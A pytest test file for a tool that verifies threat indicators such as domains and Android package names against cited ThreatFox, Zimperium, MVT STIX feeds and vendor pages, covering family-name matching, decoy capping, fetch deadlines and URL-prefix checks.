    d = str(tmp_path)
    assert cr.check("thief.example", "feed:threatfox#Predator", d, family="Predator")[0] == "BAD_INPUT"
    # a family that only shares the name, marked not_campaign, is checked as a plain family
    assert cr.check("thief.example", "feed:threatfox#Predator The Thief", d, family="Predator The Thief",
                    not_campaign=True)[0] == "FOUND"
    # but not_campaign can't mark a campaign's own name, nor ride with a key (round 13, S13-1)
    assert cr.check("thief.example", "feed:threatfox#Pegasus", d, family="Pegasus", not_campaign=True)[0] == "BAD_INPUT"
    assert cr.check("thief.example", "feed:threatfox#Pegasus.", d, family="Pegasus.", not_campaign=True)[0] == "BAD_INPUT"
    assert cr.check("thief.example", "feed:threatfox#Predator The Thief", d, family="Predator The Thief",
                    campaign="predator", not_campaign=True)[0] == "BAD_INPUT"


def test_decoys_cannot_force_not_found(tmp_path, monkeypatch):
    monkeypatch.setattr(cr, "MAX_OCCURRENCES", 5)
    cr.clear_caches()
    lines = "\n".join(f"h2.example,Decoy{i}" for i in range(10)) + "\nh2.example,Hook"
    (tmp_path / "zimperium-ioc.txt").write_text(dump("x/samples.csv", lines))
    assert cr.check("h2.example", "feed:zimperium-ioc#Hook", str(tmp_path))[0] == "CAPPED"


def test_stix_not_equal_and_idless_family_objects(tmp_path):
    cr.clear_caches()
    objs = [{"type": "malware", "id": "malware--a", "name": "Alpha"}, {"type": "malware", "name": "Bravo"},
            {"type": "indicator", "id": "indicator--1", "pattern": "[domain-name:value NOT = 'ne.example']"},
            {"type": "indicator", "id": "indicator--3", "pattern": "[domain-name:value NOT='ne2.example']"},
            {"type": "indicator", "id": "indicator--2", "pattern": "[domain-name:value = 'un.example']"}]
    (tmp_path / "mvt-indicators.txt").write_text(dump("b/bundle.stix2", json.dumps({"objects": objs})))
    d = str(tmp_path)
    assert cr.check("un.example", "feed:mvt-indicators#Alpha", d)[0] == "FAMILY_MISMATCH"   # two family objects
    assert cr.check("ne.example", "feed:mvt-indicators#Alpha", d)[0] in ("FAMILY_MISMATCH", "NOT_FOUND")
    assert cr.check("ne2.example", "feed:mvt-indicators#Alpha", d)[0] in ("FAMILY_MISMATCH", "NOT_FOUND")


def test_deadline_covers_fetch_and_parse(monkeypatch):
    monkeypatch.setattr(cr, "DEADLINE_S", 1)
    monkeypatch.setattr(cr, "url_problem", lambda url, allowed: None)
    monkeypatch.setattr(cr, "fetch", lambda url, allowed: (b"<p>x</p>", "text/html", url, []))
    monkeypatch.setattr(cr, "find_indicator", lambda ind, text: time.sleep(5))
    start = time.monotonic()
    assert cr.check("evil.com", "https://slow.example/x", None)[0] == "FETCH_FAILED"
    assert time.monotonic() - start < 4


def test_single_mode_refuses_multi_tenant_prefix(tmp_path):
    prefixes = tmp_path / "prefixes.txt"
    prefixes.write_text("https://github.com/\n")
    r = run("--indicator", "evil.com", "--reference", "https://citizenlab.ca/x",
            "--allowed-prefixes", str(prefixes), "--feed-dir", str(tmp_path))
    assert r.returncode == 2 and r.stdout.startswith("BAD_INPUT"), r.stdout + r.stderr


def test_batch_refuses_prefix_without_trailing_slash(tmp_path):
    (tmp_path / "sources.json").write_text(json.dumps([{"id": "threat_research",
                                                        "reference_prefixes": ["https://citizenlab.ca"]}]))
    (tmp_path / "cand.yml").write_text("entries:\n- indicator: evil.com\n"
                                       "  reference: 'https://citizenlab.ca/x'\n  source: threat_research\n")
    r = run("--entries", str(tmp_path / "cand.yml"), "--allowed-sources", str(tmp_path / "sources.json"),
            "--feed-dir", str(tmp_path))
    assert json.loads(r.stdout.splitlines()[0])["status"] == "BAD_INPUT"


def test_wbr_does_not_split_a_long_package_name():
    # ESET pages break long package names with <wbr> / <wbr />; the void tag joins, it does not separate.
    for tag in ("<wbr>", "<wbr/>", "<wbr />"):
        page = f"<p>The app com.example.{tag}longname{tag}.callinfo was found.</p>"
        assert found("com.example.longname.callinfo", page), tag
    assert found("other.app", "<p>com.example.longname <b>other.app</b></p>")
    assert not found("com.example.longname", "<p>com.example.<wbr></p><p>longname</p>")
